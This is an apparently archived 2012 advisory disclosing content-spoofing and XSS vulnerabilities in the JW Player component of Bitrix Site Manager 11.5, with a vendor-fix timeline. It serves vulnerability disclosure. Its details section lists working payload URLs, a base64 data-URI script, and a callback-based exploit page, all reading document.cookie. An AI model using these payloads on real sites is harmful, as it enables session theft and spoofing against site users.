@@ -1,0 +1,175 @@
+id: 19616
+date: 10/22/2012
+title: Bitrix Site Manager 11.5 XSS / Content Spoofing
+author: MustLive
+cves: 
+
+I want to warn you about security vulnerabilities in Bitrix Site Manager. It 
+is commercial CMS.
+
+These are Content Spoofing and Cross-Site Scripting vulnerabilities. These 
+holes bypass built-in WAF and all other protections of Bitrix.
+
+-------------------------
+Affected products:
+-------------------------
+
+Vulnerable are Bitrix Site Manager 11.5 and previous versions. Which consist 
+JW Player Pro.
+
+Versions of Bitrix 11.5 after 2012.08.24 must be not affected, because the 
+developers fixed these holes after my informing. As I've checked (at main 
+sites of developers, where I found these vulnerabilities), they were fixed 
+by removing this flash file.
+
+Vulnerabilities are similar to the ones in JW Player 
+(http://securityvulns.ru/docs28176.html) and JW Player Pro 
+(http://securityvulns.ru/docs28483.html).
+
+For finding these holes, which bypass WAF and all other their protections, 
+1C-Bitrix had no need to waste their time and money on conducting 
+competition on hacking conference CC9 
+(http://www.1c-bitrix.ru/about/life/news/171346/) for bypassing their 
+Proactive Protection (WAF) and other protections of CMS, or working with one 
+security company, all of which were unable to find these holes in Bitrix for 
+many years, but they just should contact me. Or just read my public advisory 
+in June concerning vulnerabilities in JW Player.
+
+----------
+Details:
+----------
+
+Content Spoofing (WASC-12):
+
+In parameter file there can be set as video, as audio files.
+
+Swf-file of JW Player accepts arbitrary addresses in parameters file and 
+image, which allows to spoof content of flash - i.e. by setting addresses of 
+video (audio) and/or image files from other site.
+
+http://site/bitrix/components/bitrix/player/mediaplayer/player.swf?file=1.flv&backcolor=0xFFFFFF&screencolor=0xFFFFFF
+http://site/bitrix/components/bitrix/player/mediaplayer/player.swf?file=1.flv&image=1.jpg
+
+Swf-file of JW Player accepts arbitrary addresses in parameter config, which 
+allows to spoof content of flash - i.e. by setting address of config file 
+from other site (parameters file and image in xml-file accept arbitrary 
+addresses). For loading of config file from other site it needs to have 
+crossdomain.xml.
+
+http://site/bitrix/components/bitrix/player/mediaplayer/player.swf?config=1.xml
+
+1.xml
+
+<config>
+  <file>1.flv</file>
+  <image>1.jpg</image>
+</config>
+
+Swf-file of JW Player accepts arbitrary addresses in parameter playlistfile, 
+which allows to spoof content of flash - i.e. by setting address of playlist 
+file from other site (parameters media:content and media:thumbnail in 
+xml-file accept arbitrary addresses). For loading of playlist file from 
+other site it needs to have crossdomain.xml.
+
+http://site/bitrix/components/bitrix/player/mediaplayer/player.swf?playlistfile=1.rss
+http://site/bitrix/components/bitrix/player/mediaplayer/player.swfplaylistfile=1.rss&playlist.position=right&playlist.size=200
+
+1.rss
+
+<rss version="2.0" xmlns:media="http://search.yahoo.com/mrss/">
+  <channel>
+    <title>Example playlist</title>
+    <item>
+      <title>Video #1</title>
+      <description>First video.</description>
+      <media:content url="1.flv" duration="5" />
+      <media:thumbnail url="1.jpg" />
+    </item>
+    <item>
+      <title>Video #2</title>
+      <description>Second video.</description>
+      <media:content url="2.flv" duration="5" />
+      <media:thumbnail url="2.jpg" />
+    </item>
+  </channel>
+</rss>
+
+XSS (WASC-08):
+
+http://site/bitrix/components/bitrix/player/mediaplayer/player.swf?playerready=alert(document.cookie)
+
+XSS (WASC-08):
+
+If at the site at page with jwplayer.swf (player.swf) there is possibility 
+(via HTML Injection) to include JS code with callback-function, and there 
+are 19 such functions in total, then it's possible to conduct XSS attack. 
+I.e. JS-callbacks can be used for XSS attack.
+
+Example of exploit:
+
+<script type="text/javascript" src="jwplayer.js"></script>
+<div id="container">...</div>
+<script type="text/javascript">
+jwplayer("container").setup({
+flashplayer: "jwplayer.swf",
+file: "1.flv",
+autostart: true,
+height: 300,
+width: 480,
+events: {
+onReady: function() { alert(document.cookie); },
+onComplete: function() { alert(document.cookie); },
+onBufferChange: function() { alert(document.cookie); },
+onBufferFull: function() { alert(document.cookie); },
+onError: function() { alert(document.cookie); },
+onFullscreen: function() { alert(document.cookie); },
+onMeta: function() { alert(document.cookie); },
+onMute: function() { alert(document.cookie); },
+onPlaylist: function() { alert(document.cookie); },
+onPlaylistItem: function() { alert(document.cookie); },
+onResize: function() { alert(document.cookie); },
+onBeforePlay: function() { alert(document.cookie); },
+onPlay: function() { alert(document.cookie); },
+onPause: function() { alert(document.cookie); },
+onBuffer: function() { alert(document.cookie); },
+onSeek: function() { alert(document.cookie); },
+onIdle: function() { alert(document.cookie); },
+onTime: function() { alert(document.cookie); },
+onVolume: function() { alert(document.cookie); }
+}
+});
+</script>
+
+There is such feature as logo in licensed version of the player. So in 
+licensed versions of swf-file there are also the next vulnerabilities:
+
+Content Spoofing (WASC-12):
+
+http://site/bitrix/components/bitrix/player/mediaplayer/player.swf?file=1.flv&logo.file=1.jpg&logo.link=http://websecurity.com.ua
+
+XSS (WASC-08):
+
+http://site/bitrix/components/bitrix/player/mediaplayer/player.swf?file=1.flv&logo.file=1.jpg&logo.link=javascript:alert(document.cookie)
+
+Content Spoofing (WASC-12):
+
+http://site/bitrix/components/bitrix/player/mediaplayer/player.swf?abouttext=Player&aboutlink=http://site
+
+XSS (WASC-08):
+
+http://site/bitrix/components/bitrix/player/mediaplayer/player.swf?abouttext=Player&aboutlink=data:text/html;base64,PHNjcmlwdD5hbGVydChkb2N1bWVudC5jb29raWUpPC9zY3JpcHQ%2B
+
+------------
+Timeline:
+------------ 
+
+2012.08.16 - informed developers about the first part of vulnerabilities.
+2012.08.17 - on their answer, I gave recommendations to developers about 
+fixing vulnerabilities.
+2012.08.19 - informed developers about the second part of vulnerabilities.
+2012.08.20 - announced at my site.
+2012.08.24 - developers informed that they have fixed all these 
+vulnerabilities.
+2012.10.20 - disclosed at my site (http://websecurity.com.ua/5992/).
+
+#  0day.today [2023-03-27]  #
